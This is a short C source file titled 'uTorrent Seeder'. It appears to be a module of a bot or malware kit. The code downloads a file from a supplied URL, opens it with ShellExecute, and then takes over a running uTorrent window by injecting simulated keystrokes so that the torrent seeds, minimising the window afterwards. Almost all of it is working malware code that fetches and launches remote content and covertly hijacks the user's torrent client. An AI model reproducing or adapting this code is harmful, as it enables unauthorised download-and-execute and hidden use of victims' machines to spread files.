/*
uTorrent Seeder
Coded by a59
*/
#include <windows.h>
#include <urlmon.h>
#include <stdio.h>
#include "includes.h"
#include "extern.h"
#pragma comment( lib, "Urlmon.lib" )

#include "seeder.h"

HWND uTorrentWindow = 0;

BOOL CALLBACK EnumProc( HWND hWnd, LPARAM lParam )
{
	char szTitle[ 512 ];
	
	GetWindowText( hWnd, szTitle, sizeof( szTitle ) );
	
	if( strstr( szTitle, "\xB5Torrent" ) )
		uTorrentWindow = hWnd;
	
	return TRUE;
};

HWND FindUTorrent( )
{
	EnumWindows( EnumProc, 0 );
	return( uTorrentWindow );
};

void TypeString( char* szString )
{
	int Length = strlen( szString ), i;
	bool ShiftDown = false;
	short sKey;
	
	for( i = 0; i < Length; i++, szString++ )
	{
		sKey = VkKeyScan( *szString );
		
		if( ( sKey >> 8 ) & 1 )
		{
			keybd_event( VK_LSHIFT, 0, 0, 0 );
			ShiftDown = true;
		}
		
		keybd_event( (unsigned char)sKey, 0, 0, 0 );
		
		if( ShiftDown )
		{
			keybd_event( VK_LSHIFT, 0, KEYEVENTF_KEYUP, 0 );
			ShiftDown = false;
		}
	}
};

int SeedUTorrent( char* szUrl, char* szSaveAs, char* szSeedTo )
{
	HWND uTorrentWindow = FindUTorrent( );
	
	if( uTorrentWindow == 0 )
		return 1;
	
	if( URLDownloadToFile( 0, szUrl, szSaveAs, 0, 0 ) != S_OK )
		return 2;
	
	if( (int)ShellExecute( 0, "open", szSaveAs, 0, 0, SW_NORMAL ) <= 32 )
		return 3;
	
	ShowWindow( uTorrentWindow, SW_SHOW );
	BringWindowToTop( uTorrentWindow );
	SetForegroundWindow( uTorrentWindow );
	SetFocus( uTorrentWindow );
	
	if( !IsWindow( uTorrentWindow ) )
		return 4;
	
	Sleep( 300 );
	
	if( *szSeedTo != 0 )
		TypeString( szSeedTo );
	
	keybd_event( VK_RETURN, 0, 0, 0 );
	ShowWindow( uTorrentWindow, SW_MINIMIZE );
	
	return 0;
};

int utorrent( )
{
		
 SeedUTorrent( szUrl, szDir, szRar );

	return 0;
};

